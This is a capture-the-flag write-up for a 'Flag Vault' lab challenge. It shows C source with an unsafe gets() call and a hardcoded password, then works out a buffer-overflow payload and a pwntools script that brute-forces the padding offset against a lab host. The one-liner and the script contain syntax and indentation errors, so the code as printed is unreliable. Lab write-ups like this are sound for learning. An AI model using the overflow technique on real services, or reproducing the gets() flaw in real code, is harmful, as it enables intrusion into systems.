Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.
>source code

```C
#include <stdio.h>
#include <string.h>

void print_banner(){
        printf( "  ______ _          __      __         _ _   \n"
                " |  ____| |         \\ \\    / /        | | |  \n"
                " | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
                " |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
                " | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
                " |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
                "                  __/ |                      \n"
                "                 |___/                       \n"
                "                                             \n"
                "Version 1.0 - Passwordless authentication evolved!\n"
                "==================================================================\n\n"
              );
}

void print_flag(){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        printf("%s", flag);
}

void login(){
        char password[100] = "";
        char username[100] = "";

        printf("Username: ");
        gets(username);

        // If I disable the password, nobody will get in.
        //printf("Password: ");
        //gets(password);

        if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
                print_flag();
        }
        else{
                printf("Wrong password! No flag for you.");
        }
}

void main(){
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);

        // Start login process
        print_banner();
        login();

        return;
}
```

- the programme asks us for username, and to print the flag the programme need a correct username and password (`bytereaper`, `5up3rP4zz123Byte`) , since the password is disabled, we have to do a buffer overflow to bypass the password check to do that we have to exploit `gets()` function. 
- All we have to do is calculate the correct offset
- we can start our payload with the username, include a null terminator, then include the correct offset, and finally the password

## **exploitation :**

- we are trying to inject payload `bytereaper\x00 + "A"*90 + 5up3rP4zz123Byte` : 
	- command that we can use : `python -c 'bytereaper\x00 + "A"*90 + 5up3rP4zz123Byte' | nc IP_ADDRESS 1337`
	- ![](https://github.com/zakaria-mghili/writeups_HackfinityBattle_2025/blob/756de3fdc7cb63f5f956c9045102c222f814def4/img/2025-03-25%2021_41_05-TryHackMe%20_%20Hackfinity%20Battle%20Encore%20-%20Brave.png)
>The exploitation didn't work

- it didn't work because there is an alignement , we can use the following script to add the correct offset 
```python
from pwn import *

 IP = "10.10.81.220"
 PORT = 1337 

 username = b"bytereaper\x00"
 password = b"5up3rP4zz123Byte"

 for offset in range(100,130):
     padding = b"A"* offset
     payload = username + padding + password

     print(f"#### Trying offset: {offset}")

     try:
        p=remote(IP, PORT)
        p.sendline(payload)
        response=p.recvall().decode(errors="ignore")
        p.close()

        if "Wrong password!" not in response:
            print(f"\n Success at Offset {offset}!\n")
            print(response)
            break

        print(f" Offset {offset} failed.")

    except Exception as e:
        print(e)

print("\n testing is finish")
                             
```

> after running this command ,the result is : 

![](https://github.com/zakaria-mghili/writeups_HackfinityBattle_2025/blob/756de3fdc7cb63f5f956c9045102c222f814def4/img/2025-03-25%2023_23_11-Flag%20Vault%20-%20obsidian%20-%20Obsidian%20v1.8.9.png)
